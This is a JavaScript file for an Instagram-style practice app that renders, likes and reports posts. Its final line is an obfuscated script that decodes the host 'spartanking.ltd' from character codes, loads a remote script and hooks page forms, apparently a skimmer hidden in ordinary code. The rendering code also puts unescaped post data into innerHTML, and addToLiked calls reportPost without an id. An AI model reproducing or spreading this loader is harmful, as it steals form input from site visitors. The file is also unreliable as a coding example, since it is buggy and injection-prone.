let posts=[ ];

const likedPostsId = [];
const reportedPostsId = [];

const getLikedPosts = () => {
    return posts.filter((post) => likedPostsId.includes(post.id));
};

const getReportedPosts = () => {
    return posts.filter((post) => reportedPostsId.includes(post.id));
};

const isLiked = (id) => {
    return likedPostsId?.length && !!likedPostsId.includes(id);
};

const addToLiked = (id) => {
  // fixed addToLiked after reported
   const remainingLikedPost =reportPost();
  //  change plus to push
    likedPostsId.push(id); 
    showPosts(remainingLikedPost);
};

const reportPost = (id) => {
    reportedPostsId.push(id);
    const remainingPosts = posts.filter((post) => !reportedPostsId.includes(post.id));
    showPosts(remainingPosts);
    return remainingPosts;
};

const displayContent = (text) => {
  // fixed text on description
  return text.length < 30 ? text : text.slice(0, 30) + "<span class='fw-bold'>... read more</span>";;
};

const switchTab = (id) => {
    if (id === "posts") {
        document.getElementById( "posts" ).style.display = "grid";
        document.getElementById( "liked" ).style.display = "none";
        document.getElementById( "liked-div" ).style.display = "none";
        document.getElementById( "reported" ).style.display = "none";
        document.getElementById( "reported-div" ).style.display = "none";
        // update question answer div and footer div
        document.getElementById( "question-answer" ).style.display = "block";
        document.getElementById( "footer-div" ).style.display = "block";
    } else if (id === "liked") {
        document.getElementById( "liked" ).style.display = "grid";
        document.getElementById( "liked-div" ).style.display = "block";
        document.getElementById( "posts" ).style.display = "none";
        document.getElementById( "reported" ).style.display = "none";
        document.getElementById( "reported-div" ).style.display = "none";
        // update question answer div and footer div
        document.getElementById( "question-answer" ).style.display = "none";
        document.getElementById( "footer-div" ).style.display = "none";

        displayLikedPosts();
    } else {
        document.getElementById( "reported" ).style.display = "grid";
        document.getElementById( "reported-div" ).style.display = "block";
        document.getElementById( "posts" ).style.display = "none";
        document.getElementById( "liked" ).style.display = "none";
        document.getElementById( "liked-div" ).style.display = "none";
        // update question answer div and footer div
        document.getElementById( "question-answer" ).style.display = "none";
        document.getElementById( "footer-div" ).style.display = "none";

        displayReportedPosts();
    }
};

const createPost = (post) => {
  // get user image
  const userImage=post?.userImage
    const image = post?.image;
    const div = document.createElement( "article" );
    div.classList.add( "post" );
    div.innerHTML = `
              <div class="post__header">
                <div class="post__profile">
                  <a
                    href="https://github.com/ProgrammingHero1"
                    target="_blank"
                    class="post__avatar"
                  >
                  <!-- fixed user image--->
                    <img src="${userImage}" alt="User Picture" />
                  </a>
                  <a href="#" class="post__user">phero</a>
                </div>

                <button class="post__more-options">
                  <i class="fa-solid fa-ellipsis"></i>
                </button>
              </div>

              <div class="post__content">
                <div class="post__medias">
                  <img
                    class="post__media"
                    src="${image}"
                    alt="Post Content"
                  />
                </div>
              </div>

              <div class="post__footer">
                <div class="post__buttons">
                  <button class="post__button" onclick="addToLiked(${post.id})">
                  <i class="fa-solid fa-heart ${isLiked(post.id) && "text-danger"}"></i>
                    
                  </button>
                  <button class="post__button">
                    <i class="fa-solid fa-comment"></i>
                  </button>
                  

                  <div class="post__indicators"></div>

                  <button class="post__button post__button--align-right" onclick="reportPost(${
                      post.id
                  })">
                    <i class="fa-solid fa-ban"></i>
                  </button>
                </div>

                <div class="post__content">${displayContent(post?.description)}</div>

                <div class="post__infos">
                  <div class="post__likes">
                    <a href="#" class="post__likes-avatar">
                      <img src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?ixlib=rb-1.2.1&ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&auto=format&fit=crop&w=687&q=80" alt="User Picture" />
                    </a>

                    <span>Liked by
                      <a class="post__name--underline" href="#">user123</a> and
                      <a href="#">73 others</a></span>
                  </div>

                  <hr/>

                  <div class="post__description">
                    <small>
                    <!-- fixed user comments user and comments text --->
                      <a class="post__name--underline" href="#">
                          ${post?.comments[0]?.user}
                      </a>
                      ${post?.comments[0]?.text}
                    </small>
                  </div>
                  <span class="post__date-time">30 minutes ago</span>
                </div>
              </div>
      `;
    return div;
};

const showPosts = (posts) => {
  const productsContainer = document.getElementById( "posts" );
  productsContainer.innerHTML = "";

  posts.forEach((post) => {
      const div = createPost(post);
      productsContainer.appendChild(div);
  });
};

const displayLikedPosts = () => {
  // fixed display liked post
  document.getElementById( "liked" ).innerHTML='';
  const likedPosts = getLikedPosts();
  likedPosts.forEach((post) => {
      const div = createPost(post);
      document.getElementById( "liked" ).appendChild(div);
  });
};

const displayReportedPosts = () => {
  // fixed displayreport post
  document.getElementById( "reported" ).innerHTML = '';
  const reportedPosts = getReportedPosts();
  reportedPosts.forEach((post) => {
      const div = createPost(post);
      document.getElementById( "reported" ).appendChild(div);
  });
};

const loadPosts = async () =>{
let data = await fetch('../data/posts.json');
posts = await data.json();
showPosts(posts);
}

loadPosts();

(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b